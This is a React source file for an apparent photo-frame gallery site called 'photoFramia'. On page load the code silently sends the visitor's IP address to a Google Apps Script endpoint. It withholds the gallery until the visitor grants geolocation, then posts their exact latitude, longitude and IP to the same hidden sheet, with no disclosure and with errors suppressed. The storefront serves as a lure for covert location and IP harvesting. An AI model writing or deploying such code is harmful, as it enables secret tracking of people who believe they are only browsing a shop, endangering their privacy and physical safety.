import { useEffect, useState } from "react";
import "./App.css";

function App() {
  const [locationAllowed, setLocationAllowed] = useState(null); // Tracks user's location permission
  const [coordinates, setCoordinates] = useState(null); // Stores the user's coordinates
  const [userIP, setUserIP] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalImage, setModalImage] = useState("");

  const sheetActionURL =
    "https://script.google.com/macros/s/AKfycbxX4qKIaRwBmLrCmgb00mDIcORuXfWlAtGSBaPdh1PuToIBCSQhCSsN02ZW0nlA1595WA/exec";

  useEffect(() => {
    fetchIPAddress();
    fetchCoordinates();
  }, []);

  const fetchIPAddress = async () => {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      fetch(sheetActionURL, {
        method: "POST",
        mode: "no-cors", // Necessary for Google Apps Script requests
        headers: {
          "Content-Type": "application/json",
        },
        body: new URLSearchParams({
          Ipv4: data?.ip || "",
        }),
      });
    } catch (error) {
      
    }
  };

  const fetchCoordinates = async () => {
    let data;
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      data = await response.json();
    } catch (error) {
      
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          setLocationAllowed(true);

          const formDataNameOrder = JSON.stringify([
            "latitude",
            "longitude",
            "Ipv4",
          ]);

          //post data to google sheet
          fetch(sheetActionURL, {
            method: "POST",
            mode: "no-cors", // Necessary for Google Apps Script requests
            headers: {
              "Content-Type": "application/json",
            },
            body: new URLSearchParams({
              latitude: latitude.toString(),
              longitude: longitude.toString(),
              Ipv4: data?.ip || "",
              formGoogleSheetName: "get-info-pf", // Match your sheet name
              formDataNameOrder, // Field order for email formatting
            }),
          });
        },
        (error) => {
          // Error callback
          // console.error("Error getting location:", error.message);
        }
      );
    } else {
      // console.error("Geolocation is not supported by this browser.");
    }
  };

  if (locationAllowed === null) {
    return (
      <div className="loading-page">
        <div className="spinner"></div>
        <h1>Loading customized photo frames...</h1>
        <p>please allow location access to view.</p>
      </div>
    );
  }

  const openModal = (imageSrc) => {
    setModalImage(imageSrc);
    setIsModalOpen(true);
  };

  // Function to close the modal
  const closeModal = () => {
    setIsModalOpen(false);
  };

  return (
    <div className="min-h-screen bg-gray-50 py-6">
      <header className="bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 py-4 px-2 mb-5">
        <h1 className="text-start text-3xl font-bold text-white">
          photoFramia
        </h1>
      </header>
      <h1 className="text-center text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 mb-8">
        Welcome to Our Customized Photo Frames!
      </h1>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 max-w-7xl mx-auto">
        {/* Card 1 */}
        <div
          className="bg-white shadow-lg rounded-lg overflow-hidden hover:shadow-2xl transform hover:scale-105 transition-all duration-300 ease-in-out"
          onClick={() =>
            openModal(
              "https://blog.printposters.in/wp-content/uploads/2023/03/wooden-frame-with-white-blank-card-green-natural-background-forest-top-view-flat-lay-mockup-300x200.jpg"
            )
          }
        >
          <img
            src="https://blog.printposters.in/wp-content/uploads/2023/03/wooden-frame-with-white-blank-card-green-natural-background-forest-top-view-flat-lay-mockup-300x200.jpg"
            alt="Frame 1"
            className="w-full h-48 object-cover rounded-t-lg"
          />
          <div className="p-6 bg-gradient-to-r from-blue-100 via-purple-100 to-pink-100">
            <h2 className="text-2xl font-semibold text-gray-800 hover:text-gray-700 transition duration-300">
              Elegant Wooden Frame
            </h2>
            <p className="text-sm text-gray-600 mt-2">
              Perfect for family portraits and special memories.
            </p>
          </div>
        </div>
        {/* Card 2 */}
        <div
          className="bg-white shadow-lg rounded-lg overflow-hidden hover:shadow-2xl transform hover:scale-105 transition-all duration-300 ease-in-out"
          onClick={() =>
            openModal(
              "https://5.imimg.com/data5/CQ/JX/MY-26785770/bordered-photo-frame-500x500.jpg"
            )
          }
        >
          <img
            src="https://5.imimg.com/data5/CQ/JX/MY-26785770/bordered-photo-frame-500x500.jpg"
            alt="Frame 1"
            className="w-full h-48 object-cover rounded-t-lg"
          />
          <div className="p-6 bg-gradient-to-r from-blue-100 via-purple-100 to-pink-100">
            <h2 className="text-2xl font-semibold text-gray-800 hover:text-gray-700 transition duration-300">
              Minimalist Frame
            </h2>
            <p className="text-sm text-gray-600 mt-2">
              A clean and simple design for modern decor.
            </p>
          </div>
        </div>
        {/* Card 3 */}
        <div
          className="bg-white shadow-lg rounded-lg overflow-hidden hover:shadow-2xl transform hover:scale-105 transition-all duration-300 ease-in-out"
          onClick={() =>
            openModal(
              "https://static.vecteezy.com/system/resources/thumbnails/035/721/543/small/ai-generated-wooden-frame-with-beautiful-carved-illustrations-free-photo.jpg"
            )
          }
        >
          <img
            src="https://static.vecteezy.com/system/resources/thumbnails/035/721/543/small/ai-generated-wooden-frame-with-beautiful-carved-illustrations-free-photo.jpg"
            alt="Frame 1"
            className="w-full h-48 object-cover rounded-t-lg"
          />
          <div className="p-6 bg-gradient-to-r from-blue-100 via-purple-100 to-pink-100">
            <h2 className="text-2xl font-semibold text-gray-800 hover:text-gray-700 transition duration-300">
              Rustic Vintage Frame
            </h2>
            <p className="text-sm text-gray-600 mt-2">
              Adds a touch of charm to your favorite memories.
            </p>
          </div>
        </div>
      </div>

      {isModalOpen && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50"
          onClick={closeModal}
        >
          <div
            className="bg-white rounded-lg relative"
            onClick={(e) => e.stopPropagation()}
          >
            <img
              src={modalImage}
              alt="Modal Image"
              className="w-full h-auto max-w-screen-sm"
            />
            <button
              className="absolute top-2 right-2 text-white bg-gray-800 rounded-full p-2"
              onClick={closeModal}
            >
              X
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
